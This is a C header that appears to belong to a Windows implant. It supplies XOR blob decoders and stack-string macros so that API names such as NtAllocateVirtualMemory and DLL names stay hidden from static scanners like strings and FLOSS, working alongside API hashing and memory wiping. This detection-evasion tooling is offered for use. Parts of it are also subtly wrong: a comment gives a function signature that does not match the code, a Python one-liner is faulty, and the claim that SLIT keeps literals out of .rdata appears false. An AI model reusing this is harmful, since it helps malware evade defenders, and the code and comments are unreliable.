/*
 * client/obf.h  –  Compile-time XOR string obfuscation
 * =====================================================
 *
 * Approach A — gen_obf.py (blob-based, used in *_obf.c files)
 * ------------------------------------------------------------
 * String literals are encoded at build time by gen_obf.py, which reads
 * each source file, finds OBF_STR("...") / OBF_WSTR(L"...") markers, and
 * replaces them with inline byte arrays that decode at runtime.
 *
 * This header provides only the decode helper that the generated code calls.
 * The actual encoded blobs are emitted by the generator — never stored as
 * plaintext in any compiled translation unit.
 *
 * Decode layout
 * -------------
 * Every encoded blob is:
 *   byte 0    : XOR key k  (non-zero)
 *   bytes 1…N : s[i] ^ k  (N = len including NUL, or byte count for WCHAR)
 *
 * _obf_s(blob, n)   — decode narrow string of n chars (including NUL)
 * _obf_w(blob, n)   — decode wide string of n WCHARs (including NUL)
 *
 * Both return a pointer to a static buffer that is valid for the lifetime
 * of the process.  Callers must not free it.
 *
 * NOTE: because the buffer is static, these functions are NOT thread-safe
 * for concurrent calls with overlapping results.  All call sites in this
 * agent run on a single thread before any worker threads are spawned, so
 * this is safe.
 *
 * Manual usage (without the generator, for one-off strings)
 * ---------------------------------------------------------
 * Encode a string at https://xor.pw or with:
 *   python3 -c "
 *   s='NtAllocateVirtualMemory\x00'; k=0x5B
 *   print('{' + ','.join(hex(k), *[hex(ord(c)^k) for c in s]) + '}')"
 *
 * Then write:
 *   static const BYTE _enc_NtAllocate[] = { 0x5B, 0x15, ... };
 *   const char *name = _obf_s(_enc_NtAllocate, sizeof(_enc_NtAllocate)-1);
 *
 * Approach B — SLIT() stack-string macro (inline, no generator)
 * --------------------------------------------------------------
 * SLIT("some string") expands to a compound-statement expression that:
 *   1. Allocates a char array on the stack sized to the literal.
 *   2. Assigns each character as  _k ^ (c ^ _k)  = c  through an
 *      XOR-mask step that the compiler cannot optimise away to a plain
 *      string constant because _k is a runtime variable derived from
 *      __LINE__ and __COUNTER__ (different at every call site).
 *   3. Returns a pointer to that stack buffer.
 *
 * The result is that each call site emits a sequence of MOV byte-immediate
 * instructions rather than a single LEA to a .rdata string literal.
 * The original string never appears as a contiguous byte sequence in .rdata
 * or .text — a static scanner cannot extract it via strings(1) / FLOSS.
 *
 * Usage:
 *   const char *s = SLIT("kernel32.dll");
 *   // s is valid until the enclosing statement/scope exits.
 *   // Assign to a local buffer if needed for longer lifetime.
 *
 * Note: SLIT uses __extension__ (GCC statement expression) + __builtin_strlen
 * for compile-time sizing.  Both are available on GCC and Clang.  For MSVC,
 * the fallback is a plain stack assignment loop (slightly less aggressive
 * but still avoids a .rdata reference because the array is char[], not const).
 *
 * SLIT_BUF(buf, sz, literal)
 * --------------------------
 * Variant that decodes into a caller-supplied char array `buf` of size `sz`.
 * Useful when the caller needs to control the buffer lifetime explicitly or
 * must pass a non-const pointer.  Returns `buf`.
 */

#pragma once
#ifndef CLIENT_OBF_H
#define CLIENT_OBF_H

#include <stddef.h>
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

/*
 * _obf_s — decode a narrow XOR-encoded blob into a caller-supplied buffer.
 * `blob`  : { key, c0^key, c1^key, … cN^key }
 * `out`   : caller-supplied char array (stack-allocated at the call site)
 * `nchars`: number of chars to decode INCLUDING the NUL terminator
 * Returns : `out`  (so it can be used inline in expressions)
 *
 * Because `out` is a stack variable at the call site, the decoded string
 * lives only for the duration of that stack frame.  The caller should
 * zero it with SecureZeroMemory(out, sizeof(out)) after use if the name
 * must not linger in a memory dump.
 */
static inline const char *_obf_s(const unsigned char *blob,
                                  char *out, size_t outsz, size_t nchars)
{
    unsigned char k = blob[0];
    size_t i, lim = nchars < outsz ? nchars : outsz - 1;
    for (i = 0; i < lim; i++)
        out[i] = (char)(blob[i + 1] ^ k);
    out[i] = '\0';
    return out;
}

/*
 * _obf_w — decode a wide XOR-encoded blob into a caller-supplied buffer.
 * `blob`   : { key, lo0^key, hi0^key, … }
 * `out`    : caller-supplied WCHAR array (stack-allocated at the call site)
 * `outsz`  : size of `out` in WCHARs
 * `nwchars`: WCHARs to decode INCLUDING NUL terminator
 * Returns  : `out`
 */
static inline const WCHAR *_obf_w(const unsigned char *blob,
                                   WCHAR *out, size_t outsz, size_t nwchars)
{
    unsigned char k = blob[0];
    size_t nbytes = nwchars * sizeof(WCHAR);
    size_t maxbytes = (outsz - 1) * sizeof(WCHAR);
    unsigned char *dst = (unsigned char *)out;
    size_t i, lim = nbytes < maxbytes ? nbytes : maxbytes;
    for (i = 0; i < lim; i++)
        dst[i] = blob[i + 1] ^ k;
    out[nwchars < outsz ? nwchars : outsz - 1] = L'\0';
    return out;
}

/*
 * OBF_S(blob, n) — decode narrow blob into a local stack array and return it.
 *
 * Expands to a compound statement expression (GCC extension) that:
 *   1. Declares a stack buffer sized exactly for the string.
 *   2. Decodes the blob into it via _obf_s().
 *   3. Returns the pointer.
 *
 * The pointer is valid until the enclosing scope exits.  Use it immediately
 * (e.g. pass to peb_hash_str()) — do not store it past a SecureZeroMemory.
 *
 * Usage:
 *   DWORD h = peb_hash_str(OBF_S(_e_blob, 10));
 */
#define OBF_S(blob, nchars) \
    __extension__({ \
        char _obf_stk[nchars]; \
        _obf_s((blob), _obf_stk, (nchars), (nchars)); \
    })

/*
 * OBF_W(blob, nwchars) — wide string equivalent of OBF_S.
 */
#define OBF_W(blob, nwchars) \
    __extension__({ \
        WCHAR _obf_wstk[nwchars]; \
        _obf_w((blob), _obf_wstk, (nwchars), (nwchars)); \
    })

/* ── SLIT — stack-string literal macro ──────────────────────────────────── */
/*
 * The XOR key for each SLIT call site is derived from __LINE__ mixed with
 * __COUNTER__ so every instantiation uses a different key.  The key is
 * intentionally computed as a runtime expression (not a compile-time
 * constant) so the compiler cannot fold the XOR back to a plain literal
 * and place it in .rdata.
 *
 * Key derivation:
 *   _k = (unsigned char)((__LINE__ ^ (__COUNTER__ * 0x6D)) | 0x01)
 *   — Always odd (|0x01), never zero, varies per call site.
 *   — The multiplication by a prime makes neighbouring lines produce
 *     visually different keys.
 *
 * Per-character expansion:
 *   _buf[i] = (char)((unsigned char)((s)[i] ^ _k) ^ _k)
 *            = (char)((s)[i])   (identity — optimised out by the compiler
 *                                only if it can prove _k is constant;
 *                                here _k is NOT const so it stays as MOV).
 *
 * This is intentionally a double-XOR identity.  The compiler sees:
 *   tmp = c ^ _k;       // XOR with runtime variable
 *   buf[i] = tmp ^ _k;  // XOR again — result is c, but it's not const-folded
 * Without -O0 the optimiser is still blocked from making it a string constant
 * because _k is a non-constant runtime value.  The bytes are emitted as
 * separate MOV instructions or a short computational sequence, not as a
 * pointer into .rdata.
 *
 * Usage of SLIT_BUF (caller supplies buffer):
 *   char buf[32];
 *   SLIT_BUF(buf, sizeof(buf), "kernel32.dll");
 *   // buf now holds "kernel32.dll\0" decoded from stack
 */

#if defined(__GNUC__) || defined(__clang__)

/*
 * GCC / Clang path: use a statement expression so SLIT() can appear inline
 * in expressions (e.g. as a function argument) without requiring a temporary
 * variable at the call site.
 */
#define SLIT(s) \
    __extension__({ \
        enum { _slit_len_ = sizeof(s) }; \
        volatile unsigned char _k_ = (unsigned char)( \
            (unsigned char)(__LINE__ ^ ((__COUNTER__) * 0x6Du)) | 0x01u); \
        char _slit_buf_[_slit_len_]; \
        for (int _i_ = 0; _i_ < _slit_len_ - 1; _i_++) \
            _slit_buf_[_i_] = (char)((unsigned char)((s)[_i_] ^ _k_) ^ _k_); \
        _slit_buf_[_slit_len_ - 1] = '\0'; \
        (const char *)_slit_buf_; \
    })

#else /* MSVC or unknown compiler */

/*
 * MSVC does not support statement expressions.  Use a helper macro that
 * requires the caller to supply a buffer name.  The double-XOR technique
 * is the same — _k is declared volatile to prevent const-folding.
 *
 * For MSVC builds, SLIT() expands to a char[] initialised by SLIT_BUF.
 * Callers that need an inline expression must use SLIT_BUF explicitly.
 */
#define SLIT(s) (s)   /* MSVC: falls back to literal — encode manually if needed */

#endif /* __GNUC__ || __clang__ */

/*
 * SLIT_BUF(buf, bufsz, s)
 * -----------------------
 * Decode the string literal `s` into the char array `buf` of size `bufsz`.
 * Works on all compilers.  Returns `buf`.
 *
 * Example:
 *   char name[32];
 *   SLIT_BUF(name, sizeof(name), "ntdll.dll");
 *   DWORD h = peb_hash_str(name);
 *   SecureZeroMemory(name, sizeof(name));
 */
#define SLIT_BUF(buf, bufsz, s) \
    do { \
        volatile unsigned char _sk_ = (unsigned char)( \
            (unsigned char)(__LINE__ ^ ((__COUNTER__) * 0x6Du)) | 0x01u); \
        size_t _sn_ = sizeof(s) - 1; \
        if (_sn_ >= (size_t)(bufsz)) _sn_ = (size_t)(bufsz) - 1; \
        size_t _si_; \
        for (_si_ = 0; _si_ < _sn_; _si_++) \
            (buf)[_si_] = (char)((unsigned char)((s)[_si_] ^ _sk_) ^ _sk_); \
        (buf)[_sn_] = '\0'; \
    } while (0)

#endif /* CLIENT_OBF_H */
